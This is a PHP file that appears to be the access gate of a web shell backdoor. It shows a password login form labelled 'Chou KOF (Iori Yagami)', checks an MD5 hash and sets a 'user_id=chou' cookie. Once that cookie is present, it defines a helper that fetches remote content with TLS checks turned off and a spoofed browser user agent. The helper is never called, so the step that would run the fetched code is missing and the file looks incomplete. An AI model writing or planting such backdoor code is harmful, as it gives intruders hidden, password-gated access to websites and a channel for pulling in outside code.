<?php

// Function to check if the user is logged in based on the presence of a valid cookie
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'chou';
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    // Function to get URL content (similar to your previous code)
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '102a6ed6587b5b8cb4ebbe972864690b'; // Replace this with your MD5 hashed password
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'chou', time() + 3600, '/'); 
        } else {
            echo "Please try again.";
        }
    }
    ?>
    
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                background-image: url('https://wallpapercave.com/wp/wp5517162.jpg');
                background-size: cover;
                background-repeat: no-repeat;
                background-attachment: fixed;
                background-position: center;
                font-family: Arial, sans-serif;
                color: white;
                margin: 0;
                padding: 0;
            }
            #login-form {
                margin-top: 100px;
                padding: 20px;
                background-color: rgba(0, 0, 0, 0.5);
                border-radius: 10px;
            }
            label {
                display: block;
                margin-bottom: 10px;
            }
            input[type=password] {
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
                border-radius: 5px;
                border: none;
            }
            input[type=submit] {
                width: 100%;
                padding: 10px;
                background-color: red;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            input[type=submit]:hover {
                background-color: #45a049;
            }

            /* Responsive */
            @media only screen and (max-width: 600px) {
                #login-form {
                    margin-top: 50px;
                }
            }
        </style>
    </head>
    <body>
        <center>
            <div id="login-form">
                <form method="POST" action="">
                    <label for="password">Chou KOF (Iori Yagami): </label>
                    <input type="password" id="password" name="password">
                    <input type="submit" value="MONTAGE">
                </form>
            </div>
        </center>
    </body>
    </html>

    <?php
}
?>